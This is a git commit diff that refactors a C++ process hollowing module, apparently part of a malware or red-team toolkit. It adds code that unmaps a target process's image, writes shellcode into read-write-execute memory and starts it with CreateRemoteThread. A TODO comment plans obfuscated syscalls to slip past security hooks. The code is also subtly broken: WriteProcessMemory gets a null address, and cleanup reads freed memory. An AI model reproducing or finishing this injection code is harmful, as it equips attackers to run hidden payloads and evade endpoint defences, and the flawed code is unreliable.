e7b25221ef365aeae2865048e3714c503e1f96ce
NoOoBiiii <heissewie@gmail.com>
2024-09-21 16:53:18 +0200

    Refactor process hollowing

--- include/injection/process_hallowing.cpp
+++ include/injection/process_hallowing.cpp
@@ -1,9 +1,14 @@
+// Credit: https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/ProcessHollowing.cpp
+// Credit: https://gist.github.com/benpturner/43b46506e4f98e5b860f72c3a6c42367
+
+// TODO: Use obfuscated syscalls instead of most likely hooked functions like CreateRemoteThread
+
 #include "process_hallowing.h"
 #include "internal.h"
 #include "pe.h"
 
 bool InitializeHollowProcess(STARTUPINFOA *&pStartupInfo, PROCESS_INFORMATION *&pProcessInfo, PPEB &pPEB, PLOADED_IMAGE &pImage, char *targetPath) {
-    PRINT("creating process", PRINT_DEBUG);
+    PRINT("creating process", PRINT_INFO);
     pStartupInfo = new STARTUPINFOA();
     pProcessInfo = new PROCESS_INFORMATION();
 
@@ -28,18 +33,35 @@ bool InitializeHollowProcess(STARTUPINFOA *&pStartupInfo, PROCESS_INFORMATION *&
     return true;
 }
 
-bool UnmapDestinationSection(HANDLE process, PPEB pPEB) {
+bool UnmapDestinationSection(HANDLE hProcess, PPEB pPEB) {
+    PRINT("unmapping process memory", PRINT_INFO);
     HMODULE hNTDLL = GetModuleHandleA("ntdll");
     FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
 
     auto NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
     DWORD dwResult = NtUnmapViewOfSection(
-            process,
+            hProcess,
             pPEB->ImageBaseAddress
     );
 
     if (dwResult) {
         PRINT("failed to unmap destination section", PRINT_ERROR);
+        return false;
+    }
+
+    return true;
+}
+
+bool AllocateAndWriteMemory(HANDLE hProcess, const std::vector<BYTE> &shellcode, LPVOID *pAllocatedMemory) {
+    PRINT("allocating and writing shellcode to the target process", PRINT_INFO);
+    *pAllocatedMemory = VirtualAllocEx(hProcess, nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if(!*pAllocatedMemory) {
+        PRINT("failed to allocate memory in the target process", PRINT_ERROR);
+        return false;
+    }
+
+    if(!WriteProcessMemory(hProcess, nullptr, shellcode.data(), shellcode.size(), nullptr)) {
+        PRINT("failed to write shellcode to the target process", PRINT_ERROR);
         return false;
     }
 
@@ -61,6 +83,8 @@ void CreateHollowProcess(char *targetPath, const std::vector<BYTE> &shellcode) {
     PROCESS_INFORMATION *pProcessInfo = nullptr;
     PPEB pPEB = nullptr;
     PLOADED_IMAGE pImage = nullptr;
+    LPVOID pAllocatedMemory = nullptr;
+    HANDLE hRemoteThread = nullptr;
 
     if (!InitializeHollowProcess(pStartupInfo, pProcessInfo, pPEB, pImage, targetPath)) {
         goto cleanup;
@@ -70,19 +94,33 @@ void CreateHollowProcess(char *targetPath, const std::vector<BYTE> &shellcode) {
         goto cleanup;
     }
 
-    // TODO Continue implementation: https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/ProcessHollowing.cpp
+    if (!AllocateAndWriteMemory(pProcessInfo->hProcess, shellcode, &pAllocatedMemory)) {
+        goto cleanup;
+    }
+
+    hRemoteThread = CreateRemoteThread(pProcessInfo->hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pAllocatedMemory, nullptr, 0, nullptr);
+    if (hRemoteThread == nullptr) {
+        PRINT("failed to create remote thread", PRINT_ERROR);
+        goto cleanup;
+    }
 
 cleanup:
-    if (pStartupInfo != nullptr) {
+    if (pStartupInfo) {
         delete pStartupInfo;
     }
-    if (pProcessInfo != nullptr) {
+    if (pProcessInfo) {
         delete pProcessInfo;
     }
-    if (pPEB != nullptr) {
+    if (pPEB) {
         delete pPEB;
     }
-    if (pImage != nullptr) {
+    if (pImage) {
         delete pImage;
+    }
+    if (pAllocatedMemory) {
+        VirtualFreeEx(pProcessInfo->hProcess, pAllocatedMemory, 0, MEM_RELEASE);
+    }
+    if (hRemoteThread) {
+        CloseHandle(hRemoteThread);
     }
 }
